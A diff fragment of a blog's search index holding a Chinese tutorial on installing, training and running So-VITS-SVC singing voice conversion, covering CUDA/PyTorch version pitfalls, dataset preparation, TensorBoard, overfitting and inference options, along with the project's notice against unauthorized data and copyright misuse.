+    <content><![CDATA[<h1 id="So-VITS-SVC简介"><a href="#So-VITS-SVC简介" class="headerlink" title="So-VITS-SVC简介"></a>So-VITS-SVC简介</h1><h2 id="什么是So-VITS-SVC？"><a href="#什么是So-VITS-SVC？" class="headerlink" title="什么是So-VITS-SVC？"></a>什么是So-VITS-SVC？</h2><p> 从名字就看得出来，So-vits-svc(SoftVC VITS Singing Voice Conversion)是基于VITS的开源项目，VITS（Variational Inference with adversarial learning for end-to-end Text-to-Speech）是一种结合变分推理（variational inference）、标准化流（normalizing flows）和对抗训练的高表现力语音合成模型</p>
+<details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>与VITS同源的除了So-VITS-SVC,还有RVC </summary>
+              <div class='content'>
+              <div class="note tip"><p>RVC也就是我们平常说的实时变声器中的一种，可以理解为实时推理的SVC，也因此，他对硬件要求更高  </p></div>
+              </div>
+            </details>
+<hr>
+<h2 id="运行配置"><a href="#运行配置" class="headerlink" title="运行配置"></a>运行配置</h2><h3 id="最低配置"><a href="#最低配置" class="headerlink" title="最低配置"></a>最低配置</h3><p>显卡：独立显存大于或等于6G</p>
+<p>CPU：能用就行</p>
+<p>内存：4G及以上</p>
+<h3 id="推荐配置"><a href="#推荐配置" class="headerlink" title="推荐配置"></a>推荐配置</h3><p>显卡：独立显存16G及以上</p>
+<p>CPU：i5 12400f</p>
+<p>内存：8G及以上</p>
+<p>显然，SO-VITS-SVC对于硬件最大的要求就是显卡的显存，理论上，只要有一张好卡，CPU从路边捡一个来用都能跑….</p>
+<hr>
+<h1 id="警告！！！"><a href="#警告！！！" class="headerlink" title="警告！！！"></a>警告！！！</h1><p>由于So-VITS-SVC使用的是Pytorch环境，所以…</p>
+<p>CUDA版本不能超过12.0！<br>CUDA版本不能超过12.0！<br>CUDA版本不能超过12.0！</p>
+<p>这是很多人都会犯的一个错误，现在当我们去安装N卡驱动时，都会自带一个CUDA12.3,使用了这个版本的CUDA后显卡是 不 能 用于训练模型与推理的，PyTorch会认不出来你的显卡，在So-VITS-SVC眼中，你 是 没 有 显 卡 的。</p>
+<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><blockquote>
+<p>卸载掉已经安装好的显卡驱动，然后在<a class="link"   href="https://pytorch.org/?ref=blog.illacloud.com" >PyTorch官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>找到对应的版本并下载安装，CUDA版本要和Torch版本相匹配。</p>
+<blockquote>
+<p>根据你所选择的Torch版本，下载对应的CUDA驱动，建议选择联网下载版本的安装包，CUDA会自带显卡驱动</p>
+</blockquote>
+</blockquote>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>当你手动安装了PyTorch后，请将你的requirements.txt（或者requirements_win.txt）中与PyTorch相关的项删除，然后再<code>pip install -r requirements.txt</code></p>
+<p>若是已经用了requirements.txt中的PyTorch，那么请确保你的CUDA版本与PyTorch版本对应。</p>
+<hr>
+<h1 id="使用建议"><a href="#使用建议" class="headerlink" title="使用建议"></a>使用建议</h1><h2 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h2><h2 id="在安装So-VITS-SVC的项目依赖时，我强烈建议你使用Conda虚拟环境，能够有效避免大部分依赖之间的冲突（划重点）"><a href="#在安装So-VITS-SVC的项目依赖时，我强烈建议你使用Conda虚拟环境，能够有效避免大部分依赖之间的冲突（划重点）" class="headerlink" title="在安装So-VITS-SVC的项目依赖时，我强烈建议你使用Conda虚拟环境，能够有效避免大部分依赖之间的冲突（划重点）"></a>在安装So-VITS-SVC的项目依赖时，我强烈建议你使用Conda虚拟环境，能够有效避免大部分依赖之间的冲突（划重点）</h2><h2 id="数据集的准备"><a href="#数据集的准备" class="headerlink" title="数据集的准备"></a>数据集的准备</h2><p>数据集总时长最好是在1h+，内容 <em>必须</em> 是干净无污染的人声。建议在准备数据集的时候，应该注意一下不同音域之间的时长——若是完全没有高音&#x2F;低音的数据集，那么训练出来的模型效果也会非常糟糕</p>
+<details class="red" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>请注意： </summary>
+              <div class='content'>
+              <ol><li>不允许使用 <em>非授权数据集</em> 进行训练，由 <em>非授权数据集</em> 数据集引起的问题需自行承担全部责任和后果！与仓库、仓库维护者、svc develop team 无关！</li><li>任何发布到视频平台的基于 sovits 制作的视频，都必须要在简介明确指明用于变声器转换的输入源歌声、音频，例如：使用他人发布的视频 &#x2F; 音频，通过分离的人声作为输入源进行转换的，必须要给出明确的原视频、音乐链接；若使用是自己的人声，或是使用其他歌声合成引擎合成的声音作为输入源进行转换的，也必须在简介加以说明。</li><li>由输入源造成的侵权问题需自行承担全部责任和一切后果。使用其他商用歌声合成软件作为输入源时，请确保遵守该软件的使用条例，注意，许多歌声合成引擎使用条例中明确指明不可用于输入源进行转换！</li><li>禁止使用该项目从事违法行为与宗教、政治等活动，该项目维护者坚决抵制上述行为，不同意此条则禁止使用该项目。</li></ol>
+              </div>
+            </details>
+<h3 id="恭喜你，如果到了这里还没有出现什么大问题的话，那么你的So-VITS-SVC之旅已经完成了一半"><a href="#恭喜你，如果到了这里还没有出现什么大问题的话，那么你的So-VITS-SVC之旅已经完成了一半" class="headerlink" title="恭喜你，如果到了这里还没有出现什么大问题的话，那么你的So-VITS-SVC之旅已经完成了一半"></a>恭喜你，如果到了这里还没有出现什么大问题的话，那么你的So-VITS-SVC之旅已经完成了一半</h3><h1 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h1><h2 id="开启TensorBoard面板"><a href="#开启TensorBoard面板" class="headerlink" title="开启TensorBoard面板"></a>开启TensorBoard面板</h2><ol>
+<li>安装TensorBoar<code>pip install tensorboard</code></li>
+<li>在so-vits-svc项目文件夹打开cmd，输入<code>tensorboard --logdir=&quot;logs/44k/</code></li>
+<li>当显示 <code>Serving TensorBoard on localhost; to expose to the network, use a proxy or pass –bind_allTensorBoard 2.2.0 at http://localhost:（端口号）/ (Press CTRL+C to quit)</code><br>时，用浏览器打开 <a href="http://localhost:（端口号）">http://localhost:（端口号）</a> 即可</li>
+</ol>
+<h2 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h2><p>如何判断我们的模型是否过拟合了呢？</p>
+<p>在TensorBoard面板中：</p>
+<p>如果模型在训练集上表现很好，但在验证集上表现很差，那么很有可能模型出现了过拟合。</p>
+<h3 id="解决办法-1"><a href="#解决办法-1" class="headerlink" title="解决办法"></a>解决办法</h3><p>目前So-VITS-SVC并没有较为完善的解决办法，最好的结果便是模型能够自己跳出来，最坏的结果嘛…寄</p>
+<h2 id="all-in-mem"><a href="#all-in-mem" class="headerlink" title="all_in_mem"></a>all_in_mem</h2><p>这个选项在configs&#x2F;config.json文件中，默认是关闭的，若是自身电脑配置不算好的话强烈建议开启</p>
+<h2 id="训练步数"><a href="#训练步数" class="headerlink" title="训练步数"></a>训练步数</h2><p>模型并不是步数越高越好，太高的步数很可能就会造成过拟合这一惨状。如果步数太低，则训练出来的模型就不太像了。</p>
+<h1 id="音频推理"><a href="#音频推理" class="headerlink" title="音频推理"></a>音频推理</h1><p>在推理歌曲时，咱要注意一下以下选项：</p>
+<ol>
+<li>‘–model_path’ 模型文件路径</li>
+<li>‘–config_path’ 配置文件路径（logs文件夹下的）</li>
+<li>‘–clean_names’ 将要推理的歌曲文件，放在raw文件夹下（最好是wav格式，若是其他格式则需要配合ffmpeg）</li>
+<li>‘–spk_list’ 模型的说话人</li>
+<li>‘–clip’ 音频自动切片，单位s，低配置用户福音</li>
+<li>‘–device’ 推理设备选择，可用’cpu’或者’cuda’(显卡)</li>
+<li>‘–f0_predictor’ f0预测器选择，若推理的音频没有受到任何污染的话rmvpe最佳，若是有轻污染则使用crepe</li>
+</ol>
+<h2 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h2><p>输入源（推理的音频）同样需要遵守 <em>版权规则</em></p>
+<p>在选择输入源时，我们也应该注意以下几点：</p>
+<ol>
+<li>有明显混音、和声的人声不建议使用</li>
+<li>合唱歌曲，尤其是男女合唱的，请慎重使用</li>
+<li>过于高音&#x2F;低音的不建议使用，如果非要使用还请自行调整好音频的音高</li>
+</ol>
+<p>并不是每一次推理都能够得到非常好的效果，所以就需要发挥我们的后期才能了，这里就不过多赘述。</p>
+]]></content>
+      <tags>
+        <tag>杂谈系列</tag>
+      </tags>
+  </entry>
+</search>
